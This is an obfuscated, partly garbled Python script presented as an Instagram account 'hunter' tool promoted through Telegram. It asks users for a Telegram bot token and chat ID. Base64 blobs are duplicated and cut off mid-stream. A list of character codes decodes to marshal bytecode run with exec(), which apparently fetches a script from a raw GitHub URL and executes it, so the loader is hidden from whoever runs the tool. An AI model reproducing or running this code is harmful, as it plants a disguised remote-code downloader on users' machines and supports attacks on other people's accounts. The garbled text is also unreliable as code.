Ige2JsdWV9LT4ge2N5YW59IOKUgwp7Y3lhbn3ilIPilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9MXt3aGl0ZX0gLSB7eWVsbG93fTIwMTEgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9Mnt3aGl0ZX0gLSB7eWVsbG93fTIwMTIgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9M3t3aGl0ZX0gLSB7eWVsbG93fTIwMTMgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9NHt3aGl0ZX0gLSB7eWVsbG93fTIwMTQgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9NXt3aGl0ZX0gLSB7eWVsbG93fTIwMTUgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9Nnt3aGl0ZX0gLSB7eWVsbG93fTIwMTYgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9N3t3aGl0ZX0gLSB7eWVsbG93fTIwMTcgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9OHt3aGl0ZX0gLSB7eWVsbG93fTIwMTggICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9OXt3aGl0ZX0gLSB7eWVsbG93fTIwMTkgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9MHt3aGl0ZX0gLSB7eWVsbG93fTIwMTEge3doaXRlfX4ge3llbGxvd30yMDIzICAgICAgICAgICAgICAgICAge2N5YW59ICAgICAgICDilIMKe2N5YW594pSX4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSbCiIiIikKU1RFSU5import os,sys,base64 as BJpbnQoIkVOQ09ERUQgQlkgQHozdXN4ICIpCmltcG9ydCB3ZWJicm93c2VyCndlYmJyb3dzZXIub3BlbigiaHR0cHM6Ly90Lm1lLytVeTllSnBxa1R5aGxaR1JsIikKaW1wb3J0IHRpbWUKaW1wb3J0IHJlcXVlc3RzCmZyb20gY29sb3JhbWEgaW1wb3J0IFN0eWxlCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCgpCT0xEPVN0eWxlLkJSSUdIVApSRVNFVD1TdHlsZS5SRVNFVF9BTEwKUkVTRVQ9IlwwMzNbMG0iCllFTExPVz0iXDAzM1sxbVwwMzNbMzNtIgpHUkVFTj0iXDAzM1sxbVwwMzNbMzJtIgpSRUQ9IlwwMzNbMW1cMDMzWzMxbSIKQ1lBTj0iXDAzM1sxbVwwMzNbMzZtIgpXSElURT0iXDAzM1sxbVwwMzNbMzdtIgppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHJhbmRvbQppbXBvcnQganNvbiwgc3RyaW5nCmZyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQKaW1wb3J0IG9zCmZyb20gdXNlcl9hZ2VudCBpbXBvcnQgKgpmcm9tIHJlcXVlc3RzIGltcG9ydCBwb3N0IGFzIHBwCmZyb20gdXNlcl9hZ2VudCBpbXBvcnQgZ2VuZXJhdGVfdXNlcl9hZ2VudCBhcyBnZ2IKZnJvbSByYW5kb20gaW1wb3J0IGNob2ljZSBhcyBjYwpmcm9tIHJhbmRvbSBpbXBvcnQgcmFuZHJhbmdlIGFzIHJyCmltcG9ydCByZQppbXBvcnQgaGFzaGxpYgppbXBvcnQgdXVpZApmcm9tIHJlcXVlc3RzIGltcG9ydCBnZXQKaW1wb3J0IHN5cwpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQp0cnk6Cglmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlLCBTdHlsZSwgaW5pdApleGNlcHQ6Cglvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIGNvbG9yYW1hJykKCWZyb20gY29sb3JhbWEgaW1wb3J0IEZvcmUsIFN0eWxlLCBpbml0CnRyeToKICAgIGZyb20gY2ZvbnRzIGltcG9ydCByZW5kZXIsIHNheQpleGNlcHQ6CiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHB5dGhvbi1jZm9udHMnKQogICAgZnJvbSBjZm9udHMgaW1wb3J0IHJlbmRlciwgc2F5CmltcG9ydCB0aW1lCmluaXQoYXV0b3Jlc2V0PVRydWUpCnJlZCA9ICJcMDMzWzFtXDAzM1szMW0iCmdyZWVuID0gIlwwMzNbMW1cMDMzWzMybSIKeWVsbG93ID0gIlwwMzNbMW1cMDMzWzMzbSIKYmx1ZSA9ICJcMDMzWzFtXDAzM1szNG0iCmN5YW4gPSAiXDAzM1sxbVwwMzNbMzZtIgptYWdlbnRhID0gIlwwMzNbMW1cMDMzWzM1bSIKTSA9ICJcMDMzWzFtXDAzM1szNm0iCndoaXRlID0gIlwwMzNbMW1cMDMzWzM3bSIKb3JhbmdlID0gIlwwMzNbMW1cMDMzWzM4OzU7MjA4bSIKcmVzZXQgPSAiXDAzM1swbSIKR09KTyA9IHJlbmRlcigne01FVEF9JywgY29sb3JzPVsnd2hpdGUnLCAnYmx1ZSddLCBhbGlnbj0nY2VudGVyJykKcHJpbnQoZicnJ1xuCiAgSk9JTiBURUFNIFBSSU1FIFRPIFJVTiBUSElTIFRPT0wKICAgICAgICAnJycpCnByaW50KGYnXHgxYlsxOzM5beKUgScqNjApCklEID0gaW5wdXQoJ0VudGVyIFlvdXIgQ2hhdCBJZCAtPiAgJykKRklMRU5BTUUgPSAnTUVUQScKdG9rZW4gPSBpbnB1dCgnRW50ZXIgWW91ciBUZWxlZ3JhbSBCb3QgVG9rZW4gLT4gICcpCmFjYSA9IDAKdG90YWwgPSAwCmhpdHMgPSAwCmJhZGluc3RhID0gMApiYWRlbWFpbCA9IDAKZ29vZGlnID0gMAppbmZvaW5zdGEgPSB7fQoKZGVmIHBwcHAoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgb3V0cHV0ID0gKGYiIFtUcnVlXSA6IHtoaXRzfVxuIgogICAgICAgICAgICAgIGYiIFtHZW5dIDoge2JhZGluc3RhfVxuIgogICAgICAgICAgICAgIGYiIFtGYWxzZV0gOiB7YmFkZW1haWx9XG4iCiAgICAgICAgICAgICAgZiIgW0JhZF0gOiB7Z29vZGlnfVxuIikKICAgIHN5cy5zdGRvdXQud3JpdGUob3V0cHV0KQogICAgc3lzLnN0ZG91dC5mbHVzaCgpCgphID0gcHJpbnQoZiIiIgp7Y3lhbn3ilI/ilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilJMKe2N5YW594pSDIHtibHVlfS0+IHt3aGl0ZX1TZWxlY3QgVGhlIFllYXIgWW91IFdhbnQgVG8gSHVudCBGb3Ige2JsdWV9LT4ge2N5YW59IOKUgwp7Y3lhbn3ilIPilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9MXt3aGl0ZX0gLSB7eWVsbG93fTIwMTEgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9Mnt3aGl0ZX0gLSB7eWVsbG93fTIwMTIgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9M3t3aGl0ZX0gLSB7eWVsbG93fTIwMTMgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9NHt3aGl0ZX0gLSB7eWVsbG93fTIwMTQgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9NXt3aGl0ZX0gLSB7eWVsbG93fTIwMTUgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9Nnt3aGl0ZX0gLSB7eWVsbG93fTIwMTYgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9N3t3aGl0ZX0gLSB7eWVsbG93fTIwMTcgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9OHt3aGl0ZX0gLSB7eWVsbG93fTIwMTggICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9OXt3aGl0ZX0gLSB7eWVsbG93fTIwMTkgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9MHt3aGl0ZX0gLSB7eWVsbG93fTIwMTEge3doaXRlfX4ge3llbGxvd30yMDIzICAgICAgICAgICAgICAgICAge2N5YW59ICAgICAgICDilIMKe2N5YW594pSX4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSbCiIiIikKU1RFSU5import os,sys,base64 JpbnQoIkVOQ09ERUQgQlkgQHozdXN4ICIpCmltcG9ydCB3ZWJicm93c2VyCndlYmJyb3dzZXIub3BlbigiaHR0cHM6Ly90Lm1lLytVeTllSnBxa1R5aGxaR1JsIikKaW1wb3J0IHRpbWUKaW1wb3J0IHJlcXVlc3RzCmZyb20gY29sb3JhbWEgaW1wb3J0IFN0eWxlCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCgpCT0xEPVN0eWxlLkJSSUdIVApSRVNFVD1TdHlsZS5SRVNFVF9BTEwKUkVTRVQ9IlwwMzNbMG0iCllFTExPVz0iXDAzM1sxbVwwMzNbMzNtIgpHUkVFTj0iXDAzM1sxbVwwMzNbMzJtIgpSRUQ9IlwwMzNbMW1cMDMzWzMxbSIKQ1lBTj0iXDAzM1sxbVwwMzNbMzZtIgpXSElURT0iXDAzM1sxbVwwMzNbMzdtIgppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHJhbmRvbQppbXBvcnQganNvbiwgc3RyaW5nCmZyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQKaW1wb3J0IG9zCmZyb20gdXNlcl9hZ2VudCBpbXBvcnQgKgpmcm9tIHJlcXVlc3RzIGltcG9ydCBwb3N0IGFzIHBwCmZyb20gdXNlcl9hZ2VudCBpbXBvcnQgZ2VuZXJhdGVfdXNlcl9hZ2VudCBhcyBnZ2IKZnJvbSByYW5kb20gaW1wb3J0IGNob2ljZSBhcyBjYwpmcm9tIHJhbmRvbSBpbXBvcnQgcmFuZHJhbmdlIGFzIHJyCmltcG9ydCByZQppbXBvcnQgaGFzaGxpYgppbXBvcnQgdXVpZApmcm9tIHJlcXVlc3RzIGltcG9ydCBnZXQKaW1wb3J0IHN5cwpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQp0cnk6Cglmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlLCBTdHlsZSwgaW5pdApleGNlcHQ6Cglvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIGNvbG9yYW1hJykKCWZyb20gY29sb3JhbWEgaW1wb3J0IEZvcmUsIFN0eWxlLCBpbml0CnRyeToKICAgIGZyb20gY2ZvbnRzIGltcG9ydCByZW5kZXIsIHNheQpleGNlcHQ6CiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHB5dGhvbi1jZm9udHMnKQogICAgZnJvbSBjZm9udHMgaW1wb3J0IHJlbmRlciwgc2F5CmltcG9ydCB0aW1lCmluaXQoYXV0b3Jlc2V0PVRydWUpCnJlZCA9ICJcMDMzWzFtXDAzM1szMW0iCmdyZWVuID0gIlwwMzNbMW1cMDMzWzMybSIKeWVsbG93ID0gIlwwMzNbMW1cMDMzWzMzbSIKYmx1ZSA9ICJcMDMzWzFtXDAzM1szNG0iCmN5YW4gPSAiXDAzM1sxbVwwMzNbMzZtIgptYWdlbnRhID0gIlwwMzNbMW1cMDMzWzM1bSIKTSA9ICJcMDMzWzFtXDAzM1szNm0iCndoaXRlID0gIlwwMzNbMW1cMDMzWzM3bSIKb3JhbmdlID0gIlwwMzNbMW1cMDMzWzM4OzU7MjA4bSIKcmVzZXQgPSAiXDAzM1swbSIKR09KTyA9IHJlbmRlcigne01FVEF9JywgY29sb3JzPVsnd2hpdGUnLCAnYmx1ZSddLCBhbGlnbj0nY2VudGVyJykKcHJpbnQoZicnJ1xuCiAgSk9JTiBURUFNIFBSSU1FIFRPIFJVTiBUSElTIFRPT0wKICAgICAgICAnJycpCnByaW50KGYnXHgxYlsxOzM5beKUgScqNjApCklEID0gaW5wdXQoJ0VudGVyIFlvdXIgQ2hhdCBJZCAtPiAgJykKRklMRU5BTUUgPSAnTUVUQScKdG9rZW4gPSBpbnB1dCgnRW50ZXIgWW91ciBUZWxlZ3JhbSBCb3QgVG9rZW4gLT4gICcpCmFjYSA9IDAKdG90YWwgPSAwCmhpdHMgPSAwCmJhZGluc3RhID0gMApiYWRlbWFpbCA9IDAKZ29vZGlnID0gMAppbmZvaW5zdGEgPSB7fQoKZGVmIHBwcHAoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgb3V0cHV0ID0gKGYiIFtUcnVlXSA6IHtoaXRzfVxuIgogICAgICAgICAgICAgIGYiIFtHZW5dIDoge2JhZGluc3RhfVxuIgogICAgICAgICAgICAgIGYiIFtGYWxzZV0gOiB7YmFkZW1haWx9XG4iCiAgICAgICAgICAgICAgZiIgW0JhZF0gOiB7Z29vZGlnfVxuIikKICAgIHN5cy5zdGRvdXQud3JpdGUob3V0cHV0KQogICAgc3lzLnN0ZG91dC5mbHVzaCgpCgphID0gcHJpbnQoZiIiIgp7Y3lhbn3ilI/ilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilJMKe2N5YW594pSDIHtibHVlfS0+IHt3aGl0ZX1TZWxlY3QgVGhlIFllYXIgWW91IFdhbnQgVG8gSHVudCBGb3Ige2JsdWV9LT4ge2N5YW59IOKUgwp7Y3lhbn3ilIPilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9MXt3aGl0ZX0gLSB7eWVsbG93fTIwMTEgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9Mnt3aGl0ZX0gLSB7eWVsbG93fTIwMTIgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9M3t3aGl0ZX0gLSB7eWVsbG93fTIwMTMgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9NHt3aGl0ZX0gLSB7eWVsbG93fTIwMTQgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9NXt3aGl0ZX0gLSB7eWVsbG93fTIwMTUgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9Nnt3aGl0ZX0gLSB7eWVsbG93fTIwMTYgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9N3t3aGl0ZX0gLSB7eWVsbG93fTIwMTcgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9OHt3aGl0ZX0gLSB7eWVsbG93fTIwMTggICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9OXt3aGl0ZX0gLSB7eWVsbG93fTIwMTkgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9MHt3aGl0ZX0gLSB7eWVsbG93fTIwMTEge3doaXRlfX4ge3llbGxvd30yMDIzICAgICAgICAgICAgICAgICAge2N5YW59ICAgICAgICDilIMKe2N5YW594pSX4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSbCiIiIikKU1RFSU5import os,sys,base64 '
_ = [52, 119, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 85, 65, 65, 65, 65, 65, 65, 65, 65, 65, 56, 48, 111, 65, 65, 65, 67, 88, 65, 71, 81, 65, 90, 65, 70, 115, 65, 70, 111, 65, 65, 103, 66, 108, 65, 81, 73, 65, 90, 81, 66, 113, 65, 103, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 90, 65, 75, 109, 65, 81, 65, 65, 113, 119, 69, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 71, 111, 68, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 67, 109, 65, 81, 65, 65, 113, 119, 69, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 69, 65, 90, 65, 70, 84, 65, 67, 107, 68, 54, 81, 65, 65, 65, 65, 66, 79, 101, 108, 66, 111, 100, 72, 82, 119, 99, 122, 111, 118, 76, 51, 74, 104, 100, 121, 53, 110, 97, 88, 82, 111, 100, 87, 74, 49, 99, 50, 86, 121, 89, 50, 57, 117, 100, 71, 86, 117, 100, 67, 53, 106, 98, 50, 48, 118, 97, 109, 70, 112, 97, 51, 78, 111, 89, 87, 108, 114, 97, 67, 57, 87, 83, 86, 65, 116, 86, 69, 57, 80, 84, 67, 57, 121, 90, 87, 90, 122, 76, 50, 104, 108, 89, 87, 82, 122, 76, 50, 49, 104, 97, 87, 52, 118, 86, 109, 108, 119, 88, 50, 57, 105, 90, 105, 53, 119, 101, 83, 107, 69, 50, 103, 104, 121, 90, 88, 70, 49, 90, 88, 78, 48, 99, 57, 111, 69, 90, 88, 104, 108, 89, 57, 111, 68, 90, 50, 86, 48, 50, 103, 82, 48, 90, 88, 104, 48, 113, 81, 68, 122, 65, 65, 65, 65, 65, 80, 111, 73, 80, 72, 78, 48, 99, 109, 108, 117, 90, 122, 55, 54, 67, 68, 120, 116, 98, 50, 82, 49, 98, 71, 85, 43, 99, 103, 111, 65, 65, 65, 65, 66, 65, 65, 65, 65, 99, 122, 77, 65, 65, 65, 68, 119, 65, 119, 69, 66, 65, 100, 103, 65, 68, 52, 65, 80, 103, 65, 43, 65, 68, 53, 65, 69, 107, 65, 83, 81, 88, 74, 66, 89, 108, 70, 122, 81, 73, 110, 84, 82, 70, 88, 88, 85, 70, 88, 88, 85, 70, 88, 114, 82, 69, 72, 118, 85, 69, 72, 118, 81, 69, 72, 118, 81, 69, 72, 118, 81, 69, 72, 116, 121, 67, 65, 65, 65, 65, 65, 61, 61]
exec(marshal.loads(base64.b64decode(''.join(chr(i) for i in _))))
import os,sys,base64 as B
L='cHJpbnQoIkVOQ09ERUQgQlkgQHozdXN4ICIpCmltcG9ydCB3ZWJicm93c2VyCndlYmJyb3dzZXIub3BlbigiaHR0cHM6Ly90Lm1lLytVeTllSnBxa1R5aGxaR1JsIikKaW1wb3J0IHRpbWUKaW1wb3J0IHJlcXVlc3RzCmZyb20gY29sb3JhbWEgaW1wb3J0IFN0eWxlCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCgpCT0xEPVN0eWxlLkJSSUdIVApSRVNFVD1TdHlsZS5SRVNFVF9BTEwKUkVTRVQ9IlwwMzNbMG0iCllFTExPVz0iXDAzM1sxbVwwMzNbMzNtIgpHUkVFTj0iXDAzM1sxbVwwMzNbMzJtIgpSRUQ9IlwwMzNbMW1cMDMzWzMxbSIKQ1lBTj0iXDAzM1sxbVwwMzNbMzZtIgpXSElURT0iXDAzM1sxbVwwMzNbMzdtIgppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHJhbmRvbQppbXBvcnQganNvbiwgc3RyaW5nCmZyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQKaW1wb3J0IG9zCmZyb20gdXNlcl9hZ2VudCBpbXBvcnQgKgpmcm9tIHJlcXVlc3RzIGltcG9ydCBwb3N0IGFzIHBwCmZyb20gdXNlcl9hZ2VudCBpbXBvcnQgZ2VuZXJhdGVfdXNlcl9hZ2VudCBhcyBnZ2IKZnJvbSByYW5kb20gaW1wb3J0IGNob2ljZSBhcyBjYwpmcm9tIHJhbmRvbSBpbXBvcnQgcmFuZHJhbmdlIGFzIHJyCmltcG9ydCByZQppbXBvcnQgaGFzaGxpYgppbXBvcnQgdXVpZApmcm9tIHJlcXVlc3RzIGltcG9ydCBnZXQKaW1wb3J0IHN5cwpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQp0cnk6Cglmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlLCBTdHlsZSwgaW5pdApleGNlcHQ6Cglvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIGNvbG9yYW1hJykKCWZyb20gY29sb3JhbWEgaW1wb3J0IEZvcmUsIFN0eWxlLCBpbml0CnRyeToKICAgIGZyb20gY2ZvbnRzIGltcG9ydCByZW5kZXIsIHNheQpleGNlcHQ6CiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHB5dGhvbi1jZm9udHMnKQogICAgZnJvbSBjZm9udHMgaW1wb3J0IHJlbmRlciwgc2F5CmltcG9ydCB0aW1lCmluaXQoYXV0b3Jlc2V0PVRydWUpCnJlZCA9ICJcMDMzWzFtXDAzM1szMW0iCmdyZWVuID0gIlwwMzNbMW1cMDMzWzMybSIKeWVsbG93ID0gIlwwMzNbMW1cMDMzWzMzbSIKYmx1ZSA9ICJcMDMzWzFtXDAzM1szNG0iCmN5YW4gPSAiXDAzM1sxbVwwMzNbMzZtIgptYWdlbnRhID0gIlwwMzNbMW1cMDMzWzM1bSIKTSA9ICJcMDMzWzFtXDAzM1szNm0iCndoaXRlID0gIlwwMzNbMW1cMDMzWzM3bSIKb3JhbmdlID0gIlwwMzNbMW1cMDMzWzM4OzU7MjA4bSIKcmVzZXQgPSAiXDAzM1swbSIKR09KTyA9IHJlbmRlcigne01FVEF9JywgY29sb3JzPVsnd2hpdGUnLCAnYmx1ZSddLCBhbGlnbj0nY2VudGVyJykKcHJpbnQoZicnJ1xuCiAgSk9JTiBURUFNIFBSSU1FIFRPIFJVTiBUSElTIFRPT0wKICAgICAgICAnJycpCnByaW50KGYnXHgxYlsxOzM5beKUgScqNjApCklEID0gaW5wdXQoJ0VudGVyIFlvdXIgQ2hhdCBJZCAtPiAgJykKRklMRU5BTUUgPSAnTUVUQScKdG9rZW4gPSBpbnB1dCgnRW50ZXIgWW91ciBUZWxlZ3JhbSBCb3QgVG9rZW4gLT4gICcpCmFjYSA9IDAKdG90YWwgPSAwCmhpdHMgPSAwCmJhZGluc3RhID0gMApiYWRlbWFpbCA9IDAKZ29vZGlnID0gMAppbmZvaW5zdGEgPSB7fQoKZGVmIHBwcHAoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgb3V0cHV0ID0gKGYiIFtUcnVlXSA6IHtoaXRzfVxuIgogICAgICAgICAgICAgIGYiIFtHZW5dIDoge2JhZGluc3RhfVxuIgogICAgICAgICAgICAgIGYiIFtGYWxzZV0gOiB7YmFkZW1haWx9XG4iCiAgICAgICAgICAgICAgZiIgW0JhZF0gOiB7Z29vZGlnfVxuIikKICAgIHN5cy5zdGRvdXQud3JpdGUob3V0cHV0KQogICAgc3lzLnN0ZG91dC5mbHVzaCgpCgphID0gcHJpbnQoZiIiIgp7Y3lhbn3ilI/ilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilJMKe2N5YW594pSDIHtibHVlfS0+IHt3aGl0ZX1TZWxlY3QgVGhlIFllYXIgWW91IFdhbnQgVG8gSHVudCBGb3Ige2JsdWV9LT4ge2N5YW59IOKUgwp7Y3lhbn3ilIPilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9MXt3aGl0ZX0gLSB7eWVsbG93fTIwMTEgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9Mnt3aGl0ZX0gLSB7eWVsbG93fTIwMTIgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9M3t3aGl0ZX0gLSB7eWVsbG93fTIwMTMgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9NHt3aGl0ZX0gLSB7eWVsbG93fTIwMTQgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9NXt3aGl0ZX0gLSB7eWVsbG93fTIwMTUgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9Nnt3aGl0ZX0gLSB7eWVsbG93fTIwMTYgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9N3t3aGl0ZX0gLSB7eWVsbG93fTIwMTcgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9OHt3aGl0ZX0gLSB7eWVsbG93fTIwMTggICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9OXt3aGl0ZX0gLSB7eWVsbG93fTIwMTkgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9MHt3aGl0ZX0gLSB7eWVsbG93fTIwMTEge3doaXRlfX4ge3llbGxvd30yMDIzICAgICAgICAgICAgICAgICAge2N5YW59ICAgICAgICDilIMKe2N5